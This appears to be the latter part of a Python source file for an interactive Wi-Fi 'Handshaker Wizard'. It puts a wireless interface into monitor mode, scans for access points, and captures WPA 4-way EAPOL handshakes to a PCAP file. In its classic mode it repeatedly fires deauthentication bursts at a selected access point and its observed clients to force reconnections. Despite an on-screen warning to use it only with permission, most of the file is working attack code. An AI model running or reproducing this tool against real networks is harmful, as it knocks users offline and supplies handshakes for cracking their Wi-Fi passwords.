        def packet_handler(pkt):
            nonlocal total_packets, eapol_count, handshake_count

            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt[Dot11]

            with stats_lock:
                total_packets += 1

            # Write every packet to PCAP (filter later in Wireshark).
            writer.write(pkt)

            if packet_matches_bssid(pkt, ap.bssid):
                client_info = extract_eapol_client(dot11, ap.bssid)
                if client_info:
                    observed_client, _ = client_info
                    with stats_lock:
                        if observed_client not in observed_clients:
                            observed_clients.add(observed_client)
                            events.put(
                                (
                                    COLOR_DIM,
                                    f"[CLIENT] Observed station: {observed_client}",
                                )
                            )

            if pkt.haslayer(EAPOL):
                with stats_lock:
                    eapol_count += 1
                frame = parse_eapol_key_frame(pkt, ap.bssid)
                if not frame:
                    return

                with stats_lock:
                    clients_with_eapol.add(frame.client)
                    advanced, completed, message_number = update_handshake_progress(
                        eapol_states,
                        frame,
                    )
                    if message_number in message_counters:
                        message_counters[message_number] += 1
                    if advanced:
                        events.put(
                            (
                                COLOR_DIM,
                                f"[EAPOL] {frame.client} -> M{message_number} "
                                f"(replay={frame.replay_counter})",
                            )
                        )
                    if completed:
                        handshake_count += 1
                        events.put(
                            (
                                COLOR_SUCCESS,
                                f"[+] Validated full 4-way handshake (client: {frame.client})",
                            )
                        )

        sniffer = AsyncSniffer(iface=interface, prn=packet_handler, store=False)
        sniffer.start()

        start_time = time.time()
        started = True

        target_dict = {
            "bssid": ap.bssid,
            "ssid": ap.ssid,
            "channel": ap.channel,
        }

        deauth_enabled = DEAUTH_AVAILABLE and deauth_burst_on_sec > 0
        deauth_started = False
        deauth_stop_at: Optional[float] = None
        next_deauth_start_at: Optional[float] = None
        if deauth_enabled:
            next_deauth_start_at = start_time
            emit_event(
                (
                    f"[DEAUTH] Burst mode: {deauth_burst_on_sec:.1f}s ON "
                    f"every {deauth_burst_cycle_sec:.1f}s."
                ),
                COLOR_DIM,
            )
            with stats_lock:
                initial_client_count = len(observed_clients)
            if initial_client_count:
                emit_event(
                    f"[DEAUTH] {initial_client_count} observed client(s) available for targeted bursts.",
                    COLOR_DIM,
                )

        # Main capture loop.
        while True:
            now = time.time()
            elapsed = int(now - start_time)

            if total_duration_sec is not None and elapsed >= total_duration_sec:
                stop_reason = "timeout"
                break

            if stop_on_first_handshake:
                with stats_lock:
                    handshake_snapshot = handshake_count
                if handshake_snapshot > 0:
                    stop_reason = "handshake_detected"
                    emit_event("[CAPTURE] Full handshake detected. Stopping capture.", COLOR_SUCCESS)
                    break

            if deauth_enabled:
                if deauth_started and deauth_stop_at and now >= deauth_stop_at:
                    try:
                        deauth.stop_attack(quiet=True)
                    except TypeError:
                        deauth.stop_attack()
                    deauth_started = False
                    emit_event("[DEAUTH] Burst stopped.", COLOR_DIM)

                if (not deauth_started) and next_deauth_start_at and now >= next_deauth_start_at:
                    emit_event("[DEAUTH] Starting burst...", COLOR_WARNING)
                    burst_target = dict(target_dict)
                    burst_target["deauth_count"] = burst_deauth_count
                    live_clients: List[str] = []
                    with stats_lock:
                        if observed_clients:
                            live_clients = sorted(observed_clients)
                    if live_clients:
                        burst_target["client"] = live_clients[client_target_index % len(live_clients)]
                        client_target_index += 1
                        if HANDSHAKER_DEAUTH_VERBOSE:
                            emit_event(f"[DEAUTH] Targeting client {burst_target['client']}", COLOR_DIM)
                    elif HANDSHAKER_DEAUTH_VERBOSE:
                        emit_event("[DEAUTH] No live client yet, using broadcast pulse.", COLOR_DIM)
                    success = False
                    try:
                        success = deauth.start_deauth_attack(
                            interface,
                            burst_target,
                            quiet=not HANDSHAKER_DEAUTH_VERBOSE,
                        )
                    except TypeError:
                        success = deauth.start_deauth_attack(interface, burst_target)

                    if success:
                        now = time.time()
                        next_deauth_start_at = now + deauth_burst_cycle_sec
                        if getattr(deauth, "ATTACK_RUNNING", False):
                            deauth_started = True
                            deauth_stop_at = now + deauth_burst_on_sec
                            emit_event("[DEAUTH] Burst active.", COLOR_SUCCESS)
                        else:
                            deauth_started = False
                            deauth_stop_at = None
                            emit_event("[DEAUTH] Burst pulse sent.", COLOR_SUCCESS)
                    else:
                        next_deauth_start_at = now + deauth_burst_cycle_sec
                        emit_event("[DEAUTH] Burst failed; retrying next cycle.", COLOR_WARNING)

            # Drain asynchronous events (handshake detections).
            while True:
                try:
                    color, message = events.get(block=False)
                except queue.Empty:
                    break
                emit_event(message, color)

            with stats_lock:
                eapol_snapshot = eapol_count
                handshake_snapshot = handshake_count
                m1_snapshot = message_counters[1]
                m2_snapshot = message_counters[2]
                m3_snapshot = message_counters[3]
                m4_snapshot = message_counters[4]

            if total_duration_sec is None:
                capture_status = f"Capture: {elapsed}s (until full handshake)"
            else:
                capture_status = f"Capture: {elapsed}s / {total_duration_sec}s"

            deauth_status = "ON" if deauth_started else "idle"
            status = (
                f"{capture_status}   "
                f"EAPOL: {eapol_snapshot}   "
                f"M1/M2/M3/M4: {m1_snapshot}/{m2_snapshot}/{m3_snapshot}/{m4_snapshot}   "
                f"Handshakes: {handshake_snapshot}   "
                f"Deauth: {deauth_status}"
            )
            render_status_line(status)
            time.sleep(1)

    except KeyboardInterrupt:
        interrupted = True
        stop_reason = "interrupted"
    except Exception as exc:
        clear_status_line()
        logging.error("Capture failed: %s", exc)
        return None
    finally:
        clear_status_line()
        if sniffer:
            try:
                sniffer.stop()
            except:
                pass
        if DEAUTH_AVAILABLE:
            try:
                deauth.stop_attack(quiet=True)
            except TypeError:
                try:
                    deauth.stop_attack()
                except Exception:
                    pass
        if writer:
            writer.close()

        if interrupted:
            logging.info("Interrupted by user (Ctrl+C).")
        elif stop_reason == "handshake_detected":
            logging.info("Capture stopped after full handshake validation.")
        elif stop_reason == "timeout":
            logging.info("Capture stopped due to configured timeout.")
        else:
            logging.info("Capture stopped.")

        if started:
            duration_sec = int(time.time() - (start_time or time.time()))
        else:
            duration_sec = 0

        logging.info("")
        logging.info("=" * 70)
        logging.info(style("Capture summary:", STYLE_BOLD))
        logging.info("  File:             %s", pcap_path)
        logging.info("  Duration:         %s seconds", duration_sec)
        logging.info("  Total packets:    %s", total_packets)
        logging.info("  EAPOL packets:    %s", eapol_count)
        logging.info(
            "  M1/M2/M3/M4:      %s/%s/%s/%s",
            message_counters[1],
            message_counters[2],
            message_counters[3],
            message_counters[4],
        )
        logging.info("  Handshakes:       %s", handshake_count)
        logging.info("  Clients w/ EAPOL: %s", len(clients_with_eapol))
        logging.info("=" * 70)

    return {
        "path": pcap_path,
        "total_packets": total_packets,
        "eapol_packets": eapol_count,
        "eapol_messages": {
            "m1": message_counters[1],
            "m2": message_counters[2],
            "m3": message_counters[3],
            "m4": message_counters[4],
        },
        "detected_handshakes": handshake_count,
        "clients_with_eapol": len(clients_with_eapol),
        "stop_reason": stop_reason,
    }


def run_classic_handshaker(interface: str) -> None:
    logging.info("")
    scan_duration = prompt_int(
        f"{style('Scan duration', STYLE_BOLD)} (seconds) "
        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = 15s): ",
        default=15
    )

    logging.info("")
    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start scanning...")
    aps = scan_networks(
        interface,
        scan_duration,
        channels=DEFAULT_MONITOR_CHANNELS,
        hop_interval=DEFAULT_HOP_INTERVAL,
        update_interval=DEFAULT_LIVE_UPDATE_INTERVAL,
    )

    sorted_aps = sorted_access_points(aps)
    logging.info("")
    for line in format_network_lines(sorted_aps):
        logging.info("%s", line)

    if not sorted_aps:
        logging.info("No networks found.")
        return

    logging.info("")
    target_ap = select_access_point(sorted_aps)
    if target_ap is None:
        logging.info("No target selected. Exiting.")
        return

    logging.info("")
    logging.info("Selected: %s (%s)", format_ssid(target_ap.ssid), target_ap.bssid)
    if target_ap.channel:
        logging.info("Channel: %s", target_ap.channel)
        set_interface_channel(interface, target_ap.channel)
    else:
        logging.warning("AP channel unknown; staying on the current channel.")

    logging.info("")
    logging.info(style("Capture mode:", STYLE_BOLD))
    logging.info("Runs until a full 4-way handshake is validated or you press Ctrl+C.")

    deauth_burst_on_sec = 0.0
    deauth_burst_cycle_sec = DEFAULT_DEAUTH_BURST_CYCLE_SEC
    if DEAUTH_AVAILABLE:
        logging.info("")
        raw_burst_on = input(
            f"{style('Deauth burst ON time', STYLE_BOLD)} in seconds "
            f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {DEFAULT_DEAUTH_BURST_ON_SEC:.1f}, 0=disable): "
        ).strip()
        if not raw_burst_on:
            deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC
        else:
            try:
                deauth_burst_on_sec = float(raw_burst_on)
            except ValueError:
                deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC

        if deauth_burst_on_sec < 0:
            deauth_burst_on_sec = DEFAULT_DEAUTH_BURST_ON_SEC

        if deauth_burst_on_sec > 0:
            min_cycle = deauth_burst_on_sec + 0.5
            deauth_burst_cycle_sec = prompt_float(
                f"{style('Deauth burst cycle', STYLE_BOLD)} in seconds "
                f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {DEFAULT_DEAUTH_BURST_CYCLE_SEC:.1f}): ",
                default=DEFAULT_DEAUTH_BURST_CYCLE_SEC,
                minimum=min_cycle,
            )
            if deauth_burst_cycle_sec <= deauth_burst_on_sec:
                deauth_burst_cycle_sec = deauth_burst_on_sec + 0.5
        else:
            logging.info("Deauth bursts disabled.")

    logging.info("")
    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start deauth + capture...")

    output_dir = DEFAULT_HANDSHAKE_DIR
    summary = capture_full_handshakes(
        interface=interface,
        ap=target_ap,
        total_duration_sec=None,
        deauth_burst_on_sec=deauth_burst_on_sec,
        deauth_burst_cycle_sec=deauth_burst_cycle_sec,
        stop_on_first_handshake=True,
        output_dir=output_dir
    )

    if summary:
        logging.info("")
        logging.info(style("Saved to:", STYLE_BOLD))
        logging.info(f"  -> {summary['path']}")
        logging.info("  Detected full handshakes: %s", summary["detected_handshakes"])
        logging.info("Open in Wireshark and filter: eapol")


def run_on_run_handshaker(interface: str) -> None:
    logging.info("")
    logging.info(style("ON RUN handshaker:", STYLE_BOLD))
    logging.info("Passive survey mode. Press Ctrl+C to stop.")
    logging.info("Active deauth bursts are disabled in this mode.")
    logging.info(
        "Walking defaults: %ss window, %.2fs hop, %.2fs refresh.",
        ON_RUN_DEFAULT_SCAN_WINDOW_SEC,
        ON_RUN_DEFAULT_HOP_INTERVAL,
        ON_RUN_LIVE_UPDATE_INTERVAL,
    )
    logging.info("")

    scan_window = prompt_int(
        f"{style('Observation window', STYLE_BOLD)} (seconds) "
        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {ON_RUN_DEFAULT_SCAN_WINDOW_SEC}s): ",
        default=ON_RUN_DEFAULT_SCAN_WINDOW_SEC,
    )
    hop_interval = prompt_float(
        f"{style('Channel dwell', STYLE_BOLD)} in seconds "
        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {ON_RUN_DEFAULT_HOP_INTERVAL:.2f}s): ",
        default=ON_RUN_DEFAULT_HOP_INTERVAL,
        minimum=0.1,
    )
    include_5ghz = prompt_yes_no(
        f"{style('Include 5 GHz channels', STYLE_BOLD)}",
        default=False,
    )
    channels = DEFAULT_MONITOR_CHANNELS if include_5ghz else ON_RUN_FAST_CHANNELS

    logging.info("")
    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start ON RUN survey...")

    scan_round = 1
    cumulative_aps: Dict[str, AccessPoint] = {}
    try:
        while True:
            logging.info("")
            logging.info(style(f"ON RUN round {scan_round}", STYLE_BOLD))
            aps = scan_networks(
                interface,
                scan_window,
                channels=channels,
                hop_interval=hop_interval,
                update_interval=ON_RUN_LIVE_UPDATE_INTERVAL,
            )
            merge_access_point_snapshots(cumulative_aps, aps)
            sorted_aps = sorted_access_points(aps)
            sorted_cumulative_aps = sorted_access_points(cumulative_aps)
            active_aps = [ap for ap in sorted_aps if ap.clients]
            active_cumulative_aps = [ap for ap in sorted_cumulative_aps if ap.clients]

            logging.info("")
            for line in format_network_lines(sorted_aps, max_items=ON_RUN_DISPLAY_LIMIT):
                logging.info("%s", line)

            logging.info("")
            logging.info(style("ON RUN summary:", STYLE_BOLD))
            logging.info("  Current window:          %s APs, %s with clients", len(sorted_aps), len(active_aps))
            logging.info(
                "  Session total:           %s APs, %s with clients",
                len(sorted_cumulative_aps),
                len(active_cumulative_aps),
            )
            logging.info("  Channel profile:         %s", "2.4 + 5 GHz" if include_5ghz else "2.4 GHz fast")
            logging.info("  Active bursts attempted: 0")
            logging.info(
                "Use Classic mode for one explicitly authorized AP when active capture is required."
            )

            scan_round += 1
            time.sleep(ON_RUN_SCAN_PAUSE_SEC)
    except KeyboardInterrupt:
        logging.info("")
        logging.info("ON RUN stopped by user.")


def main() -> None:
    logging.info(color_text("Handshaker Wizard", COLOR_HEADER))
    logging.info("Classic target capture + ON RUN passive survey")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    if not SCAPY_AVAILABLE:
        logging.error("Scapy is not installed. Install with: pip3 install scapy")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    if not DEAUTH_AVAILABLE:
        reason = f" ({DEAUTH_IMPORT_ERROR})" if DEAUTH_IMPORT_ERROR else ""
        logging.warning("Deauth module: unavailable%s. Capture will run without deauth.", reason)

    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test!")
    logging.info("")

    mode = select_handshaker_mode()
    logging.info("")

    interfaces = list_network_interfaces()
    interface = select_interface(interfaces)

    if mode == "on_run" and not confirm_on_run_disclaimer():
        logging.info("ON RUN disclaimer not confirmed. Exiting.")
        return

    original_mode = get_interface_mode(interface)
    changed_to_monitor = False

    try:
        if original_mode != "monitor":
            logging.info("")
            input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to switch {interface} to monitor mode...")
            if not set_interface_type(interface, "monitor"):
                logging.error("Failed to enable monitor mode on %s.", interface)
                sys.exit(1)
            changed_to_monitor = True
            wait_for_monitor_settle(interface)

        if mode == "classic":
            run_classic_handshaker(interface)
        else:
            run_on_run_handshaker(interface)

    finally:
        if changed_to_monitor:
            logging.info("Restoring managed mode...")
            restore_managed_mode(interface)

    input(style("\nPress Enter to exit.", COLOR_SUCCESS, STYLE_BOLD))


if __name__ == "__main__":
    main()
